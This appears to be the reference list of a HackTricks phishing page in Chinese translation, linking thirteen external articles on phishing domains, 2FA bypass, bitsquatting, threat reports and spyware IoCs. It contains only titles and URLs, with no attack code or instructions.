- [1] [用于 phishing 的域名变体生成（Zeltser）](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [发现 phishing：工具与技术（0xPatrik）](https://0xpatrik.com/phishing-domains/)
- [3] [使用 noVNC 窃取凭据并绕过 2FA（mr.d0x）](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [使用 EvilnoVNC 窃取 session 并绕过 2FA（darkbyte.net）](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [如何在 Debian Wheezy 上安装和配置带 Postfix 的 DKIM（DigitalOcean）](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [2025 Unit 42 全球事件响应报告——Social Engineering 版](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing——移动端 gated phishing 基础设施与启发式方法（Sekoia.io）](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Runtime Assembly 攻击的下一个前沿：利用 LLMs 实时生成 phishing JavaScript](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [冒充、Click Hijacking 与 TDS：深入剖析一个 Malware Distribution Ecosystem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting Windows.com（Remy Hax）](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [通过 bitflipping 劫持指向 Microsoft windows.com 的流量（BleepingComputer）](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Love? Actually：在巴基斯坦针对性 spyware campaign 中充当诱饵的 fake dating app](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [ESET GhostChat IoCs 与 samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
